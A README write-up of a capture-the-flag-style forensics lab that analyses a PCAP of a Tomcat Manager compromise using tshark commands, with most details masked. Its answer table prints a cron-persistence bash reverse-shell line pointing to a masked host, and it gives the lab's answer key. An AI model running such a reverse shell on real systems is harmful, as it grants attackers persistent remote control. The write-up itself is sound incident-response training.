# README — Tomcat Takeover Lab

Status: completed  
Type: PCAP analysis, network forensics, SOC, incident response

## Lab objective

The objective of this lab is to investigate an Apache Tomcat compromise using a PCAP file.

The investigation identifies:

- the attacker IP address;
- the exposed service;
- the enumeration tool;
- the discovered admin panel;
- the valid credentials;
- the malicious WAR file;
- the JSP reverse shell;
- the reverse shell connection;
- the persistence mechanism installed on the compromised host.

## Incident summary

The server `**********` exposes an Apache Tomcat service on port `****`.

The attacker `**********` first performs web browsing and directory enumeration. The User-Agent `************` appears in the HTTP requests, confirming that Gobuster was used to discover sensitive paths.

The attacker discovers `/*******`, then accesses `/*******/html`. Several Basic Authentication attempts are observed. The valid credential pair is `*****:******`.

After accessing Tomcat Manager, the attacker uploads `******.***`. This WAR deploys an application reachable at `/******/` and contains a malicious JSP named `********.***`.

The JSP starts a system shell and establishes an outbound connection to `**********:80`. In TCP stream `****`, the observed commands show that the attacker obtains `****`, moves to `/tmp`, and installs cron-based persistence to `**********:443`.

## Final lab answers

| Question | Answer |
|---|---|
| Q1 | `**********` |
| Q2 | `*****` |
| Q3 | `****` |
| Q4 | `********` |
| Q5 | `/*******` |
| Q6 | `*****:******` |
| Q7 | `******.***` |
| Q8 | `* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/*** 0>&1'` |

## Main commands used

### Extract HTTP requests

```bash
tshark -r "web server.pcap" -Y "http.request" -T fields -e frame.time_relative -e ip.src -e ip.dst -e tcp.dstport -e http.request.method -e http.host -e http.request.uri -e http.user_agent
```

### Identify the WAR upload

```bash
tshark -r "web server.pcap" -Y 'http.request.method == "POST" || http.request.uri contains "upload" || http.request.uri contains "******"' -T fields -E separator='|' -e frame.number -e frame.time_relative -e ip.src -e ip.dst -e http.request.method -e http.host -e http.request.uri -e http.file_data
```

### Identify Basic Auth credentials

```bash
tshark -r "web server.pcap" -Y 'http.authorization || http.authbasic || http.request.uri contains "/*******/html"' -T fields -E separator='|' -e frame.number -e frame.time_relative -e ip.src -e http.request.method -e http.request.uri -e http.authorization -e http.authbasic
```

### Follow the reverse shell stream

```bash
tshark -r "web server.pcap" -q -z follow,tcp,ascii,****
```

## Conclusion

The Tomcat server was compromised through Tomcat Manager. The attacker used valid credentials, uploaded a malicious WAR archive, triggered a JSP reverse shell, obtained `****` access, and installed cron-based persistence.
